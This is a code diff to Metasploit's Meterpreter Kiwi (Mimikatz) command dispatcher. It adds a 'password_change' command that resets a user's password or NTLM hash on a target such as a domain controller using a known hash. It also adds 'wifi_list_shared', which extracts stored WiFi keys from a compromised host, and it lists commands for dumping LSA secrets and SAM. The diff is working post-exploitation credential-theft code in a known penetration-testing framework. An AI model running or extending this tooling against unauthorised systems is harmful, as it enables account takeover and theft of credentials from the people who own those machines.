@@ -32,13 +32,13 @@ class Console::CommandDispatcher::Kiwi
   #
   # Initializes an instance of the priv command interaction. This function
   # also outputs a banner which gives proper acknowledgement to the original
-  # author of the Mimikatz 2.0 software.
+  # author of the Mimikatz software.
   #
   def initialize(shell)
     super
     print_line
     print_line
-    print_line("  .#####.   mimikatz 2.1 (#{client.session_type})")
+    print_line("  .#####.   mimikatz 2.1.1 20170608 (#{client.session_type})")
     print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
     print_line(" ## / \\ ##  /* * *")
     print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
@@ -72,13 +72,101 @@ class Console::CommandDispatcher::Kiwi
       'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
       'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
       'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
-      'wifi_list'             => 'List wifi profiles/creds',
+      'password_change'       => 'Change the password/hash of a user',
+      'wifi_list'             => 'List wifi profiles/creds for the current user',
+      'wifi_list_shared'      => 'List shared wifi profiles/creds (requires SYSTEM)',
     }
   end
 
   def cmd_kiwi_cmd(*args)
     output = client.kiwi.exec_cmd(args.join(' '))
     print_line(output)
+  end
+
+  #
+  # Valid options for the password change feature
+  #
+  @@password_change_usage_opts = Rex::Parser::Arguments.new(
+    '-h'  => [false, 'Help banner'],
+    '-u'  => [true,  'User name of the password to change.'],
+    '-s'  => [true,  'Server to perform the action on (eg. Domain Controller).'],
+    '-op' => [true,  'The known existing/old password (do not use with -oh).'],
+    '-oh' => [true,  'The known existing/old hash (do not use with -op).'],
+    '-np' => [true,  'The new password to set for the account (do not use with -nh).'],
+    '-nh' => [true,  'The new hash to set for the account (do not use with -np).']
+  )
+
+  def cmd_password_change_usage
+    print_line('Usage password_change [options]')
+    print_line
+    print_line(@@password_change_usage_opts.usage)
+  end
+
+  def cmd_password_change(*args)
+    if args.length == 0 || args.include?('-h')
+      cmd_password_change_usage
+      return
+    end
+
+    opts = {}
+
+    @@password_change_usage_opts.parse(args) { |opt, idx, val|
+      case opt
+      when '-u'
+        opts[:user] = val
+      when '-s'
+        opts[:server] = val
+      when '-op'
+        opts[:old_pass] = val
+      when '-oh'
+        opts[:old_hash] = val
+      when '-np'
+        opts[:new_pass] = val
+      when '-nh'
+        opts[:new_hash] = val
+      end
+    }
+
+    valid = true
+    if opts[:old_pass] && opts[:old_hash]
+      print_error('Options -op and -oh cannot be used together.')
+      valid = false
+    end
+
+    if opts[:new_pass] && opts[:new_hash]
+      print_error('Options -np and -nh cannot be used together.')
+      valid = false
+    end
+
+    unless opts[:old_pass] || opts[:old_hash]
+      print_error('At least one of -op and -oh must be specified.')
+      valid = false
+    end
+
+    unless opts[:new_pass] || opts[:new_hash]
+      print_error('At least one of -np and -nh must be specified.')
+      valid = false
+    end
+
+    unless opts[:user]
+      print_error('The -u parameter must be specified.')
+      valid = false
+    end
+
+    if valid
+
+      unless opts[:server]
+        print_status('No server (-s) specified, defaulting to localhost.')
+      end
+
+      result = client.kiwi.password_change(opts)
+
+      if result[:success] == true
+        print_good("Success! New NTLM hash: #{result[:new]}")
+      else
+        print_error("Failed! #{result[:error]}")
+      end
+    end
   end
 
   def cmd_dcsync(*args)
@@ -303,37 +391,50 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
-  # Dump all the wifi profiles/credentials
+  # Dump all the shared wifi profiles/credentials
+  #
+  def cmd_wifi_list_shared(*args)
+    interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
+    interfaces_dir = client.fs.file.expand_path(interfaces_dir)
+    files = client.fs.file.search(interfaces_dir, '*.xml', true)
+
+    if files.length == 0
+      print_error('No shared WiFi profiles found.')
+    else
+      interfaces = {}
+      files.each do |f|
+        interface_guid = f['path'].split("\\")[-1]
+        full_path = "#{f['path']}\\#{f['name']}"
+
+        interfaces[interface_guid] ||= []
+        interfaces[interface_guid] << full_path
+      end
+      results = client.kiwi.wifi_parse_shared(interfaces)
+
+      if results.length > 0
+        display_wifi_profiles(results)
+      else
+        print_line
+        print_error('No shared wireless profiles found on the target.')
+      end
+    end
+
+    true
+  end
+
+  #
+  # Dump all the wifi profiles/credentials for the current user
   #
   def cmd_wifi_list(*args)
     results = client.kiwi.wifi_list
-
     if results.length > 0
-      results.each do |r|
-        table = Rex::Text::Table.new(
-          'Header'    => "#{r[:desc]} - #{r[:guid]}",
-          'Indent'    => 0,
-          'SortIndex' => 0,
-          'Columns'   => [
-            'Name', 'Auth', 'Type', 'Shared Key'
-          ]
-        )
-
-        print_line
-        r[:profiles].each do |p|
-          table << [p[:name], p[:auth], p[:key_type], p[:shared_key]]
-        end
-
-        print_line(table.to_s)
-        print_line("State: #{r[:state]}")
-      end
+      display_wifi_profiles(results)
     else
       print_line
       print_error('No wireless profiles found on the target.')
     end
 
-    print_line
-    return true
+    true
   end
 
   @@creds_opts = Rex::Parser::Arguments.new(
@@ -400,6 +501,30 @@ class Console::CommandDispatcher::Kiwi
   end
 
 protected
+
+  def display_wifi_profiles(profiles)
+    profiles.each do |r|
+      header = r[:guid]
+      header = "#{r[:desc]} - #{header}" if r[:desc]
+      table = Rex::Text::Table.new(
+        'Header'    => header,
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => [
+          'Name', 'Auth', 'Type', 'Shared Key'
+        ]
+      )
+
+      print_line
+      r[:profiles].each do |p|
+        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
+      end
+
+      print_line(table.to_s)
+      print_line("State: #{r[:state] || 'Unknown'}")
+    end
+  end
+
 
   def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
     if client.sys.config.is_system?
